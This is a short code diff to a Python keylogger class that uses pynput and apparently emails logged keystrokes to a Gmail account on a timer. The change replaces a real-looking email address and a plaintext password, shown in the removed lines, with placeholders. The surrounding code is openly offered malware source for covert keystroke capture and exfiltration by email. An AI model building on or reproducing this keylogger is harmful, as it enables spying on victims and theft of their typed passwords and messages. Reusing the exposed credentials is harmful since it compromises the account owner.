@@ -12,7 +12,7 @@ from pynput.keyboard import Listener  # Import the keyboard related functions
 
 class Keylogger(object):
     # Class attributes
-    sender, receiver = ('mayaoffsetmatrix@gmail.com', 'mayaoffsetmatrix@gmail.com')
+    sender, receiver = ('youremail@gmail.com', 'youremail@gmail.com')
     ssl_context = ssl.create_default_context()  # Recommended by python for a secure SSL communication
 
     def __init__(self, _time_interval, _email_username, _password):
@@ -69,7 +69,7 @@ class Keylogger(object):
 
 
 if __name__ == '__main__':
-    user = 'mayaoffsetmatrix@gmail.com'
-    password = '?20scared#?'
+    user = 'your_email@gmail.com'
+    password = 'your_password'
     my_logger = Keylogger(60, user, password)
     my_logger.begin_keylogger()
